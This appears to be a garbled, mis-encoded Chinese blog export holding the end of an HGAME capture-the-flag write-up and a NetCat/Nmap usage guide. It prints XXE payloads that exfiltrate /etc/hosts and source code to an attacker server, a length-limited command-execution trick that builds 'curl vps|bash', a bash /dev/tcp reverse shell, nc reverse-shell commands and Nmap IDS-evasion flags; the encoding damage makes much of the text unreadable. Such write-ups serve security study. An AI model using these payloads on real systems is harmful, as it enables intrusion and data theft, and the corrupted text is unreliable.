ç”¨EncryptoforWin.exeè¾“å…¥å¯†ç è§£å¯†å³å¯å¾—flag æ—¥å¸¸ä¸‰ä¸ªæ–‡ä»¶ï¼ŒBlind.pngï¼ŒOrigin_pixivArtwork75992170.pngï¼Œæ©«è±æ’‡é»æŠ˜_av85002656.ogg ä¸¤å¼ å›¾ç‰‡ç›¸åŒï¼ŒçŒœæµ‹æ˜¯ç›²æ°´å°ï¼Œç›´æ¥ç”¨bwmï¼Œåœ°å€ï¼šhttps://github.com/chishaxie/BlindWaterMark 1python bwm.py decode Blind.png Origin_pixivArtwork75992170.png flag.png å¥½åƒçœ‹ä¸å¤ªæ¸…ï¼Œç”¨StegSolveåˆ‡æ¢ä¸€ä¸‹ å†…å®¹ä¸ºï¼šVeraCrypt Password is X0YA1GDuZF$echCy æ©«è±æ’‡é»æŠ˜_av85002656.oggbinwalkåˆ†ç¦»å‡ºä¸€ä¸ªContaineræ–‡ä»¶ï¼Œç”¨VeraCryptè§£å¯† ç„¶åå‘ç°æœ‰ä¸‰ä¸ªæ–‡ä»¶ å’Œ3ctfæµé‡åˆ†æé¢˜ç›¸ä¼¼ï¼Œå‚è€ƒï¼šhttp://www.gtfly.top/2019/11/18/è®°ä¸€æ¬¡-å†°è-ä¸€å¥è¯æœ¨é©¬æµé‡åˆ†æ.[html](http://www.gtfly.top/2019/11/18/è®°ä¸€æ¬¡-å†°è-ä¸€å¥è¯æœ¨é©¬æµé‡åˆ†æ.html) Cookiesæ–‡ä»¶æ˜¯ä»Chromeæµè§ˆå™¨å¯¼å‡ºçš„æ–‡ä»¶ï¼Œåœ¨ä¿å­˜æ—¶ï¼ŒChromeå…ˆå°†å¯†ç è¿›è¡ŒDPAPIåŠ å¯†ï¼Œå†ä¿å­˜åœ¨SQLiteæ•°æ®åº“æ–‡ä»¶ä¸­ï¼Œå› æ­¤è¿™æ˜¯ä¸€ä¸ªSQLiteæ•°æ®åº“æ–‡ä»¶ å†ä»‹ç»å‡ ä¸ªæ¦‚å¿µï¼š chrome33ä»¥ä¸Šå¯¹Cookiesè¿›è¡Œäº†åŠ å¯†ï¼Œvalueå˜ä¸ºç©ºï¼Œå¢åŠ äº†åŠ å¯†çš„encrypted_valueå­—æ®µï¼Œå­—æ®µç±»å‹æ˜¯BLOBï¼Œè¿™ä¸ªä¾¿æ˜¯æˆ‘ä»¬éœ€è¦è§£å¯†çš„å†…å®¹ Master Keyï¼š 64å­—èŠ‚ï¼Œç”¨äºè§£å¯†DPAPI BLOB é€šè¿‡ç”¨æˆ·ç™»å½•å¯†ç ã€SIDå’Œ16å­—èŠ‚éšæœºæ•°åŠ å¯†åä¿å­˜åœ¨Master Key fileä¸­ Master Key fileï¼š äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯ä½¿ç”¨ç”¨æˆ·ç™»å½•å¯†ç å¯¹å…¶è§£å¯†ï¼Œè·å¾—Master Key SIDï¼ˆSecurity Identifiersï¼ŒSIDï¼‰ï¼š å®‰å…¨æ ‡è¯†ç¬¦ï¼Œæ˜¯æ ‡è¯†ç”¨æˆ·ã€ç»„å’Œè®¡ç®—æœºå¸æˆ·çš„å”¯ä¸€çš„å·ç ã€‚åœ¨ç¬¬ä¸€æ¬¡åˆ›å»ºè¯¥å¸æˆ·æ—¶ï¼Œå°†ç»™ç½‘ç»œä¸Šçš„æ¯ä¸€ä¸ªå¸æˆ·å‘å¸ƒä¸€ä¸ªå”¯ä¸€çš„ SIDã€‚Windows 2000 ä¸­çš„å†…éƒ¨è¿›ç¨‹å°†å¼•ç”¨å¸æˆ·çš„ SID è€Œä¸æ˜¯å¸æˆ·çš„ç”¨æˆ·æˆ–ç»„åã€‚å¦‚æœåˆ›å»ºå¸æˆ·ï¼Œå†åˆ é™¤å¸æˆ·ï¼Œç„¶åä½¿ç”¨ç›¸åŒçš„ç”¨æˆ·ååˆ›å»ºå¦ä¸€ä¸ªå¸æˆ·ï¼Œåˆ™æ–°å¸æˆ·å°†ä¸å…·æœ‰æˆæƒç»™å‰ä¸€ä¸ªå¸æˆ·çš„æƒåŠ›æˆ–æƒé™ï¼ŒåŸå› æ˜¯è¯¥å¸æˆ·å…·æœ‰ä¸åŒçš„ SID å·ã€‚ ObjectNF-PC.txtæ˜¯mimikatzå¯¼å‡ºçš„ç»“æœï¼Œå¯†ç æˆ‘ä»¬èƒ½è§£å‡ºæ¥ æˆ‘ä»¬ç°åœ¨å…ˆå¯¼å‡ºBLOB ç„¶åç”¨Windows Password Recovery é€‰æ‹©å¯¼å‡ºè¦è§£å¯†çš„BLOB é€‰æ‹©Master Key fileï¼Œå³S-1-5-21-3375469711-1363829938-1291733684-1001.zipå‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å¥½åƒæ²¡æ³•åœ¨æ–‡ä»¶å¤¹é‡Œæ˜¾ç¤ºï¼Œåªéœ€å¤åˆ¶æ–‡ä»¶åï¼Œä¼šè‡ªåŠ¨åŒ¹é…æ–‡ä»¶ å¡«å†™SIDå’Œå¯†ç  å¾—åˆ°flag æ™ºæ¢°å±æœºï¼ˆ#1)æœåŠ¡ç«¯ç¨‹åºï¼š 123456789101112131415161718192021222324252627import numpy as nptrue_flag = &#x27;hgame&#123;&#125;&#x27;flag = np.loadtxt(&#x27;flag.txt&#x27;)threshold = 0.18def mse(true, predict): return np.average(np.abs(true - predict))def judge(predict): if mse(flag, predict) &lt; threshold: print(true_flag) else: print(&quot;Unfortunately! Your mse loss is over the threshold, try again!&quot;) print(&quot;Wrong flag!&quot;)if __name__ == &quot;__main__&quot;: print(&quot;Welcome to this game!&quot;) print(&quot;Please input your flag here (separated by space please):&quot;) inp=input() try: inp = np.asarray(inp.split(&#x27; &#x27;), dtype=float) judge(inp) except Exception as e: print(&quot;Internal Error!&quot;) exp: 1234567891011121314151617181920212223242526import numpy as npimport keras.models as modelsimport tensorflow as tfmodel = models.load_model(&#x27;flag.hdf5&#x27;)# model.summary()weights = model.get_layer(index=1).get_weights()W = weights[0]b = weights[1]y = np.loadtxt(&#x27;enc_flag.txt&#x27;)W_data = tf.placeholder(tf.float32, [128, 64])target = tf.placeholder(tf.float32, [64])X_op = tf.Variable(tf.truncated_normal([1, 128]))pred = tf.matmul(tf.sigmoid(X_op), W_data)loss = tf.reduce_mean(tf.abs(target - pred))optimizer = tf.train.AdamOptimizer(learning_rate=1e-3)train_op = optimizer.minimize(loss)with tf.Session() as sess: sess.run(tf.global_variables_initializer()) for i in range(10000): _, loss_value = sess.run([train_op, loss],feed_dict=&#123;W_data: W, target: y - b&#125;) if i % 100 == 0: print(i, loss_value) result = np.array(sess.run(X_op)) result[result &gt; 0.5] = 1 result[result &lt; 0.5] = 0 Week4webä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒä¸éš¾å‘ç°æ˜¯XXE payload: 123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://yourvps/exp1.dtd&quot;&gt;%remote;%int;%send;]&gt;&lt;msg&gt;&lt;id&gt;moonback&lt;/id&gt;&lt;name&gt;aasd&lt;/name&gt;&lt;level&gt;1000&lt;/level&gt;&lt;time&gt;415441&lt;/time&gt;&lt;/msg&gt; vpsä¸Šï¼š 12&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;yourvps:9001?p&#x3D;%file;&#39;&gt;&quot;&gt; æœåŠ¡å™¨ç›‘å¬9001ç«¯å£å°±å¯ä»¥è¯»æ–‡ä»¶äº†ï¼Œè¯»å–/etc/hosts 12345678127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters172.21.0.76 hgame-private172.21.0.31 f9f1b9b99e13 å‘ç°172.21.0.76æ¯”è¾ƒç‰¹æ®Šï¼Œè¯•ç€è®¿é—®ï¼Œè¿™é‡Œæœ‰ä¸ªtips: å½“ä½¿â½¤ libxml è¯»å–â½‚ä»¶å†…å®¹çš„æ—¶å€™ï¼Œâ½‚ä»¶ä¸èƒ½è¿‡â¼¤ï¼Œå¦‚æœå¤ªâ¼¤å°±ä¼šæŠ¥é”™â½†æ³•å¾—åˆ°â½‚ä»¶å†…å®¹ï¼Œå› æ­¤éœ€è¦ä½¿â½¤ phpè¿‡æ»¤å™¨çš„â¼€ä¸ªå‹ç¼©çš„â½…æ³•zlib.deflflate æ‰€ä»¥vpsä¸Šæ„é€ ï¼š 12&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;172.21.0.76&#x2F;?token&#x3D;12335565&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;yourvps:9001?p&#x3D;%file;&#39;&gt;&quot;&gt; ç„¶åæˆ‘ä»¬å°±èƒ½å¾—åˆ°å‹ç¼©åçš„ä¸œè¥¿ï¼Œåªéœ€ 12&lt;?phpinclude(&#x27;php://filter/read=convert.base64-decode/zlib.inflate/resource=a&#x27;); å°±èƒ½å¾—åˆ°æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);$token = @$_GET[&#x27;token&#x27;];if (!isset($token)) &#123; die(&quot;è¯·å¸¦ä¸Šæ‚¨çš„é˜Ÿä¼tokenè®¿é—®! /?token=&quot;);&#125;$api = &quot;http://checker/?token=&quot;.$token;$t = file_get_contents($api);if($t !== &quot;ok&quot;) &#123; die(&quot;é˜Ÿä¼tokené”™è¯¯&quot;);&#125;highlight_file(__FILE__);$sandbox = &#x27;/var/www/html/sandbox/&#x27;. md5(&quot;hgame2020&quot; . $token);;@mkdir($sandbox);@chdir($sandbox);$content = $_GET[&#x27;v&#x27;];if (isset($content)) &#123; $cmd = substr($content,0,5); system($cmd);&#125;else if (isset($_GET[&#x27;r&#x27;])) &#123; system(&#x27;rm -rf ./*&#x27;);&#125;/* _____ _ _ ______ _ _ _____ ______ _______ _____ _______ _ / ____| | | | ____| | | | / ____| ____|__ __| |_ _|__ __| | | | (___ | |__| | |__ | | | | | | __| |__ | | | | | | | | \\___ \\| __ | __| | | | | | | |_ | __| | | | | | | | | ____) | | | | |____| |____| |____ | |__| | |____ | | _| |_ | | |_| |_____/|_| |_|______|______|______( )_____|______| |_| |_____| |_| (_) |/*/ å¯ä»¥çœ‹å‡ºæ¥æ˜¯é™åˆ¶5å­—ç¬¦çš„å‘½ä»¤æ‰§è¡Œï¼Œç”±äºæ²¡æœ‰è¯´flflagåœ¨å“ªï¼Œå› æ­¤éœ€è¦åå¼¹shellâ½…ä¾¿æ‰¾flagçš„ä½ç½® åœ¨linuxä¸­ï¼Œâ¼€æ¡å‘½ä»¤å¯ä»¥é€šè¿‡ç¬¦å· \\ åˆ†å‰²ä¸ºå¤šâ¾ä¸å½±å“æ‰§â¾ç»“æœã€‚å¦‚ 123456ubuntu:~# cat testec\\ho \\hello!ubuntu:~# sh testhello! å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©â½¤è¿™ä¸ªç‰¹æ€§ï¼Œå°†è¶…â»“çš„å‘½ä»¤åˆ†å‰²ä¸ºå¤šæ®µæ¥æ‰§â¾ã€‚ ä¸ºäº†è®©æœåŠ¡å™¨è®°ä½æˆ‘ä»¬å…ˆå‰æ‰€è¾“â¼Šçš„å‘½ä»¤â½šæ®µï¼Œæˆ‘ä»¬å¯ä»¥åˆ©â½¤é‡å®šå‘ç¬¦ &gt; &gt;&gt; æ¥åœ¨å½“å‰â½¬å½•åˆ›å»ºâ½‚ä»¶ã€‚ â½‚ä»¶åå³ä¸ºæˆ‘ä»¬æ‰€éœ€çš„å‘½ä»¤â½šæ®µã€‚ ä¸ºäº†è®©åˆ›å»ºçš„â½‚ä»¶æŒ‰ç…§æˆ‘ä»¬æƒ³è¦çš„é¡ºåºæ’åˆ—ï¼Œå¯ä»¥ä½¿â½¤ ls -t ä½¿å¾—â½‚ä»¶æŒ‰ç…§åˆ›å»ºæ—¶é—´å…ˆåæ’åºã€‚ â½½ ls -t&gt;a è¶…â»“åº¦é™åˆ¶ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦â½¤ ls&gt;_ æ¥æ„é€ å‡º ls -t&gt;a 123456&gt;ls\\\\ #å†™ls\\æ–‡ä»¶ï¼Œä¼šè½¬ä¹‰æ‰€ä»¥ç”¨ä¸¤ä¸ªls&gt;_ #åˆ—ä¸¾æ–‡ä»¶ï¼Œå°†ls\\å†™å…¥_æ–‡ä»¶&gt;\\ \\\\ #å†™ç©ºæ ¼\\æ–‡ä»¶&gt;-t\\\\ #å†™-t\\æ–‡ä»¶&gt;ã€‹&gt;\\&gt;y #å†™&gt;yæ–‡ä»¶ls&gt;&gt;_ #å°†æ–‡ä»¶åè¿½åŠ åˆ°_æ–‡ä»¶å†… åå¼¹shellç›´æ¥ç”¨bashåå¼¹ 1bash -i &gt;&amp; /dev/tcp/0.0.0.0/2333 0&gt;&amp;1 è¿™æ®µä¸å¤ªå®¹æ˜“æ„é€ ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€  12345678910111213curl vps|bash&gt;bash&gt;\\|\\\\&gt;0\\\\&gt;0.\\\\&gt;0.\\\\&gt;0.\\\\&gt;\\ \\\\&gt;rl\\\\&gt;cu\\\\sh _sh y ç„¶åå°±å¯ä»¥å¼¹shellæ‹¿flagäº† ä¹Ÿå¯ä»¥å†™ä¸ªè„šæœ¬ï¼ŒæœåŠ¡å™¨ä¸Šæ”¾ä¸ªphpï¼Œæ¥æ”¶postè¿‡æ¥çš„dtdå¹¶å­˜åœ¨æ–‡ä»¶ä¸­ï¼Œæ³¨æ„ï¼š å‘½ä»¤è¦ç”¨åŸç”Ÿå­—ç¬¦ä¸² æ³¨æ„ç”Ÿæˆçš„æ–‡ä»¶æœ‰é‡å¤çš„æ²¡(æˆ‘çš„æœåŠ¡å™¨ipä¼šç”Ÿæˆä¸¤ä¸ª7.æ–‡ä»¶ï¼Œç„¶åä¸€ç›´å¼¹ä¸äº†shell,æ²¡åŠæ³•åªèƒ½ç”¨åŸŸåäº†)","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"HAGAME","slug":"HAGAME","permalink":"http://www.m00nback.xyz/tags/HAGAME/"}]},{"title":"NetCat,Nmap,WireShackå·¥å…·ä½¿ç”¨","slug":"nc-nmapå’Œwireshackä½¿ç”¨","date":"2020-01-23T07:31:05.000Z","updated":"2020-02-04T14:14:35.901Z","comments":true,"path":"2020/01/23/nc-nmapå’Œwireshackä½¿ç”¨/","link":"","permalink":"http://www.m00nback.xyz/2020/01/23/nc-nmap%E5%92%8Cwireshack%E4%BD%BF%E7%94%A8/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†NetCat,Nmap,WireShackä¸‰ä¸ªå·¥å…·ä½¿ç”¨è¯¦æƒ…ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†NetCat,Nmap,WireShackä¸‰ä¸ªå·¥å…·ä½¿ç”¨è¯¦æƒ…ï¼ NetCatå¸¸ç”¨å‚æ•°1234567891011121314-g&lt;ç½‘å…³&gt;ï¼šè®¾ç½®è·¯ç”±å™¨è·ƒç¨‹é€šä¿¡ç½‘å…³ï¼Œæœ€å¤šè®¾ç½®8ä¸ªï¼›-G&lt;æŒ‡å‘å™¨æ•°ç›®&gt;ï¼šè®¾ç½®æ¥æºè·¯ç”±æŒ‡å‘å™¨ï¼Œå…¶æ•°å€¼ä¸º4çš„å€æ•°ï¼›-hï¼šå¸®åŠ©ï¼›-i&lt;å»¶è¿Ÿç§’æ•°&gt;ï¼šè®¾ç½®æ—¶é—´é—´éš”ï¼Œä»¥ä¾¿ä¼ é€ä¿¡æ¯åŠæ‰«æé€šä¿¡ç«¯å£ï¼›-lï¼šä½¿ç”¨ç›‘å¬æ¨¡å¼ï¼Œç›‘æ§ä¼ å…¥çš„èµ„æ–™ï¼›-nï¼šç›´æ¥ä½¿ç”¨ipåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨ï¼›-o&lt;è¾“å‡ºæ–‡ä»¶&gt;ï¼šæŒ‡å®šæ–‡ä»¶åç§°ï¼ŒæŠŠå¾€æ¥ä¼ è¾“çš„æ•°æ®ä»¥16è¿›åˆ¶å­—ç å€¾å€’æˆè¯¥æ–‡ä»¶ä¿å­˜ï¼›-p&lt;é€šä¿¡ç«¯å£&gt;ï¼šè®¾ç½®æœ¬åœ°ä¸»æœºä½¿ç”¨çš„é€šä¿¡ç«¯å£ï¼›-rï¼šæŒ‡å®šæºç«¯å£å’Œç›®çš„ç«¯å£éƒ½è¿›è¡Œéšæœºçš„é€‰æ‹©ï¼›-s&lt;æ¥æºä½å€&gt;ï¼šè®¾ç½®æœ¬åœ°ä¸»æœºé€å‡ºæ•°æ®åŒ…çš„IPåœ°å€ï¼›-uï¼šä½¿ç”¨UDPä¼ è¾“åè®®ï¼›-vï¼šæ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼›-w&lt;è¶…æ—¶ç§’æ•°&gt;ï¼šè®¾ç½®ç­‰å¾…è¿çº¿çš„æ—¶é—´ï¼›-zï¼šä½¿ç”¨0è¾“å…¥&#x2F;è¾“å‡ºæ¨¡å¼ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨ è¿œç¨‹æ§åˆ¶æ­£å‘12è¢«æ§ç«¯ï¼šnc -lp 333 -c bashæ”»å‡»ç«¯ï¼šnc 1.1.1.1 333 åå‘12è¢«æ§ç«¯ï¼šnc 1.1.1.1 333 -c bashæ”»å‡»ç«¯ï¼šnc -lp 333 æ³¨ï¼šWindowsâ½¤æˆ·æŠŠbashæ”¹æˆcmd ä¼ è¾“æ–‡ä»¶ä¹Ÿæœ‰ä¸¤ç§æ–¹å¼ æ–¹å¼1ï¼š 12æ¥æ”¶ç«¯ï¼šnc -lp 333 &gt; 1.mp4å‘é€ç«¯ï¼šnc -nv 1.1.1.1 333 &lt; 1.mp4 â€“q 1 æ–¹å¼2ï¼š 12æ¥æ”¶ç«¯ï¼šnc -nv 1.1.1.1 333 &gt; a.mp4å‘é€ç«¯ï¼šnc -q 1 -lp 333 &lt; a.mp4 ä¼ è¾“ç›®å½• 12å‘é€ç«¯ï¼štar -cvf - music/ | nc -lp 333 â€“q 1æ¥æ”¶ç«¯ï¼šnc -nv 1.1.1.1 333 | tar -xvf - æ³¨æ„æœ‰ä¸ª- ç«¯å£æ‰«æ1nc -nvz 1.1.1.1 1-100 n å‚æ•°ä½œç”¨æ˜¯è·Ÿ ip åœ°å€ï¼Œä¸åš dns åŸŸåè§£æ,v å‚æ•°æ˜¯æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ã€‚z å‚æ•°å°±æ˜¯æ‰«ææ¨¡å¼ï¼Œé»˜è®¤å°±æ˜¯ tcp å…¨é“¾æ¥æ‰«æã€‚ NmapNmap å‚æ•°è¯¦è§£Nmapæ”¯æŒä¸»æœºå,ip,ç½‘æ®µçš„è¡¨ç¤ºæ–¹å¼ ä¾‹å¦‚:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254 1234-iL filename ä»æ–‡ä»¶ä¸­è¯»å–å¾…æ£€æµ‹çš„ç›®æ ‡,æ–‡ä»¶ä¸­çš„è¡¨ç¤ºæ–¹æ³•æ”¯æŒæœºå,ip,ç½‘æ®µ-iR hostnum éšæœºé€‰å–,è¿›è¡Œæ‰«æ.å¦‚æœ-iRæŒ‡å®šä¸º0,åˆ™æ˜¯æ— ä¼‘æ­¢çš„æ‰«æ--exclude host1[, host2] ä»æ‰«æä»»åŠ¡ä¸­éœ€è¦æ’é™¤çš„ä¸»æœº --exculdefile exclude_file æ’é™¤æ–‡ä»¶ä¸­çš„IP,æ ¼å¼å’Œ-iLæŒ‡å®šæ‰«ææ–‡ä»¶çš„æ ¼å¼ç›¸åŒ ä¸»æœºå‘ç° 1234567-sL ä»…ä»…æ˜¯æ˜¾ç¤º,æ‰«æçš„IPæ•°ç›®,ä¸ä¼šè¿›è¡Œä»»ä½•æ‰«æ-sn pingæ‰«æ,å³ä¸»æœºå‘ç°-Pn ä¸æ£€æµ‹ä¸»æœºå­˜æ´»-PS/PA/PU/PY[portlist] TCP SYN Ping/TCP ACK Ping/UDP Pingå‘ç°-PE/PP/PM ä½¿ç”¨ICMP echo, timestamp and netmask è¯·æ±‚åŒ…å‘ç°ä¸»æœº-PO[prococol list] ä½¿ç”¨IPåè®®åŒ…æ¢æµ‹å¯¹æ–¹ä¸»æœºæ˜¯å¦å¼€å¯ -n/-R ä¸å¯¹IPè¿›è¡ŒåŸŸååå‘è§£æ/ä¸ºæ‰€æœ‰çš„IPéƒ½è¿›è¡ŒåŸŸåçš„åå“è§£æ æ‰«ææŠ€å·§ 12345678-sS/sT/sA/sW/sM TCP SYN/TCP connect()/ACK/TCPçª—å£æ‰«æ/TCP Maimonæ‰«æ-sU UDPæ‰«æ-sN/sF/sX TCP Nullï¼ŒFINï¼Œand Xmasæ‰«æ--scanflags è‡ªå®šä¹‰TCPåŒ…ä¸­çš„flags-sI zombie host[:probeport] Idlescan-sY/sZ SCTP INIT/COOKIE-ECHO æ‰«æ-sO ä½¿ç”¨IP protocol æ‰«æç¡®å®šç›®æ ‡æœºæ”¯æŒçš„åè®®ç±»å‹-b â€œFTP relay hostâ€ ä½¿ç”¨FTP bounce scan æŒ‡å®šç«¯å£å’Œæ‰«æé¡ºåº 123456-p ç‰¹å®šçš„ç«¯å£ -p80,443 æˆ–è€… -p1-65535-p U:PORT æ‰«æudpçš„æŸä¸ªç«¯å£, -p U:53-F å¿«é€Ÿæ‰«ææ¨¡å¼,æ¯”é»˜è®¤çš„æ‰«æç«¯å£è¿˜å°‘-r ä¸éšæœºæ‰«æç«¯å£,é»˜è®¤æ˜¯éšæœºæ‰«æçš„--top-ports &quot;number&quot; æ‰«æå¼€æ”¾æ¦‚ç‡æœ€é«˜çš„numberä¸ªç«¯å£,å‡ºç°çš„æ¦‚ç‡éœ€è¦å‚è€ƒnmap-servicesæ–‡ä»¶,ubuntuä¸­è¯¥æ–‡ä»¶ä½äº&#x2F;usr&#x2F;share&#x2F;nmap.nmapé»˜è®¤æ‰«å‰1000ä¸ª--port-ratio &quot;ratio&quot; æ‰«ææŒ‡å®šé¢‘ç‡ä»¥ä¸Šçš„ç«¯å£ æœåŠ¡ç‰ˆæœ¬è¯†åˆ« 12345-sV å¼€æ”¾ç‰ˆæœ¬æ¢æµ‹,å¯ä»¥ç›´æ¥ä½¿ç”¨-AåŒæ—¶æ‰“å¼€æ“ä½œç³»ç»Ÿæ¢æµ‹å’Œç‰ˆæœ¬æ¢æµ‹--version-intensity &quot;level&quot; è®¾ç½®ç‰ˆæœ¬æ‰«æå¼ºåº¦,å¼ºåº¦æ°´å¹³è¯´æ˜äº†åº”è¯¥ä½¿ç”¨å“ªäº›æ¢æµ‹æŠ¥æ–‡ã€‚æ•°å€¼è¶Šé«˜ï¼ŒæœåŠ¡è¶Šæœ‰å¯èƒ½è¢«æ­£ç¡®è¯†åˆ«ã€‚é»˜è®¤æ˜¯7--version-light æ‰“å¼€è½»é‡çº§æ¨¡å¼,ä¸º--version-intensity 2çš„åˆ«å--version-all å°è¯•æ‰€æœ‰æ¢æµ‹,ä¸º--version-intensity 9çš„åˆ«å--version-trace æ˜¾ç¤ºå‡ºè¯¦ç»†çš„ç‰ˆæœ¬ä¾¦æµ‹è¿‡ç¨‹ä¿¡æ¯ è„šæœ¬æ‰«æ 1234567-sC æ ¹æ®ç«¯å£è¯†åˆ«çš„æœåŠ¡,è°ƒç”¨é»˜è®¤è„šæœ¬--script&#x3D;â€Lua scriptsâ€ è°ƒç”¨çš„è„šæœ¬å--script-args&#x3D;n1&#x3D;v1,[n2&#x3D;v2] è°ƒç”¨çš„è„šæœ¬ä¼ é€’çš„å‚æ•°--script-args-file&#x3D;filename ä½¿ç”¨æ–‡æœ¬ä¼ é€’å‚æ•°--script-trace æ˜¾ç¤ºæ‰€æœ‰å‘é€å’Œæ¥æ”¶åˆ°çš„æ•°æ®--script-updatedb æ›´æ–°è„šæœ¬çš„æ•°æ®åº“--script-help&#x3D;â€Lua scriptâ€ æ˜¾ç¤ºæŒ‡å®šè„šæœ¬çš„å¸®åŠ© OSè¯†åˆ« 123-O å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹,-Aæ¥åŒæ—¶å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹å’Œç‰ˆæœ¬æ£€æµ‹--osscan-limit é’ˆå¯¹æŒ‡å®šçš„ç›®æ ‡è¿›è¡Œæ“ä½œç³»ç»Ÿæ£€æµ‹(è‡³å°‘éœ€ç¡®çŸ¥è¯¥ä¸»æœºåˆ†åˆ«æœ‰ä¸€ä¸ªopenå’Œclosedçš„ç«¯å£)--osscan-guess æ¨æµ‹æ“ä½œç³»ç»Ÿæ£€æµ‹ç»“æœ,å½“Nmapæ— æ³•ç¡®å®šæ‰€æ£€æµ‹çš„æ“ä½œç³»ç»Ÿæ—¶ï¼Œä¼šå°½å¯èƒ½åœ°æä¾›æœ€ç›¸è¿‘çš„åŒ¹é…ï¼ŒNmapé»˜è®¤è¿›è¡Œè¿™ç§åŒ¹é… é˜²ç«å¢™/IDSèº²é¿å’Œå“„éª— 123456789101112-f; --mtu value æŒ‡å®šä½¿ç”¨åˆ†ç‰‡ã€æŒ‡å®šæ•°æ®åŒ…çš„MTU.-D decoy1,decoy2,ME ä½¿ç”¨è¯±é¥µéšè”½æ‰«æ-S IP-ADDRESS æºåœ°å€æ¬ºéª—-e interface ä½¿ç”¨æŒ‡å®šçš„æ¥å£-g&#x2F; --source-port PROTNUM ä½¿ç”¨æŒ‡å®šæºç«¯å£ --proxies url1,[url2],... ä½¿ç”¨HTTPæˆ–è€…SOCKS4çš„ä»£ç† --data-length NUM å¡«å……éšæœºæ•°æ®è®©æ•°æ®åŒ…é•¿åº¦è¾¾åˆ°NUM--ip-options OPTIONS ä½¿ç”¨æŒ‡å®šçš„IPé€‰é¡¹æ¥å‘é€æ•°æ®åŒ…--ttl VALUE è®¾ç½®IP time-to-liveåŸŸ--spoof-mac ADDR&#x2F;PREFIX&#x2F;VEBDOR MACåœ°å€ä¼ªè£…--badsum ä½¿ç”¨é”™è¯¯çš„checksumæ¥å‘é€æ•°æ®åŒ… Nmap è¾“å‡º 1234567891011121314151617-oN å°†æ ‡å‡†è¾“å‡ºç›´æ¥å†™å…¥æŒ‡å®šçš„æ–‡ä»¶-oX è¾“å‡ºxmlæ–‡ä»¶-oS å°†æ‰€æœ‰çš„è¾“å‡ºéƒ½æ”¹ä¸ºå¤§å†™-oG è¾“å‡ºä¾¿äºé€šè¿‡bashæˆ–è€…perlå¤„ç†çš„æ ¼å¼,éxml-oA BASENAME å¯å°†æ‰«æç»“æœä»¥æ ‡å‡†æ ¼å¼ã€XMLæ ¼å¼å’ŒGrepæ ¼å¼ä¸€æ¬¡æ€§è¾“å‡º-v æé«˜è¾“å‡ºä¿¡æ¯çš„è¯¦ç»†åº¦-d level è®¾ç½®debugçº§åˆ«,æœ€é«˜æ˜¯9--reason æ˜¾ç¤ºç«¯å£å¤„äºå¸¦ç¡®è®¤çŠ¶æ€çš„åŸå› --open åªè¾“å‡ºç«¯å£çŠ¶æ€ä¸ºopençš„ç«¯å£--packet-trace æ˜¾ç¤ºæ‰€æœ‰å‘é€æˆ–è€…æ¥æ”¶åˆ°çš„æ•°æ®åŒ…--iflist æ˜¾ç¤ºè·¯ç”±ä¿¡æ¯å’Œæ¥å£,ä¾¿äºè°ƒè¯•--log-errors æŠŠæ—¥å¿—ç­‰çº§ä¸ºerrors&#x2F;waringsçš„æ—¥å¿—è¾“å‡º--append-output è¿½åŠ åˆ°æŒ‡å®šçš„æ–‡ä»¶--resume FILENAME æ¢å¤å·²åœæ­¢çš„æ‰«æ--stylesheet PATH&#x2F;URL è®¾ç½®XSLæ ·å¼è¡¨ï¼Œè½¬æ¢XMLè¾“å‡º--webxml ä»namp.orgå¾—åˆ°XMLçš„æ ·å¼--no-sytlesheet å¿½ç•¥XMLå£°æ˜çš„XSLæ ·å¼è¡¨ å…¶ä»–nmapé€‰é¡¹ 12345678-6 å¼€å¯IPv6-A OSè¯†åˆ«,ç‰ˆæœ¬æ¢æµ‹,è„šæœ¬æ‰«æå’Œtraceroute--datedir DIRNAME è¯´æ˜ç”¨æˆ·Nmapæ•°æ®æ–‡ä»¶ä½ç½®--send-eth &#x2F; --send-ip ä½¿ç”¨åŸä»¥å¤ªç½‘å¸§å‘é€&#x2F;åœ¨åŸIPå±‚å‘é€--privileged å‡å®šç”¨æˆ·å…·æœ‰å…¨éƒ¨æƒé™--unprovoleged å‡å®šç”¨æˆ·ä¸å…·æœ‰å…¨éƒ¨æƒé™,åˆ›å»ºåŸå§‹å¥—æ¥å­—éœ€è¦rootæƒé™-V æ‰“å°ç‰ˆæœ¬ä¿¡æ¯-h è¾“å‡ºå¸®åŠ© ç«¯å£çŠ¶æ€ 